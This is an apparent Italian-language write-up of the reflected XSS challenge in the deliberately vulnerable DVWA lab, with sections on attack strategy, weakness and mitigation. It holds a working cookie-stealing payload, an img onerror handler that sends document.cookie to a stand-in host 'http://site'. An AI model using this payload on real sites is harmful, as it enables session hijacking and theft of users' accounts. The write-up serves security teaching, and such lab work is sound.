# DVWA_low - XSS Reflected

## Obiettivo della sfida
Iniettare codice JS arbitrario in form HTML a differenza delle sfida XSS Stored questa volta abbiamo a disposizione molti più carattere(in xss_s solo 50) quindi è possibile costruire attacchi più sofisticati

## Strategia di attacco
Proviamo ad iniettare nel campo "What's your name" il seguente codice:
```html
<img src = x
onerror = this.src = 'http://site?c='+document.cookie />
```
Questa iniezione provoca l'invio di una richiesta al web server http://site l'URL contiene la richiesta dei cookie dell'utente che ha caricato la pagina, quindi se il web server è sotto controllo dall'attaccante egli può leggere i cookie

## Debolezze
1. L'app non neutralizza l'input dell'utente

## Mitigazione
1. Inserire un filto basato su **whitelist** facendo scegliere l'input in una lista di valori fidati(menu a tendina),oppure, neutralizzare i caratteri speciali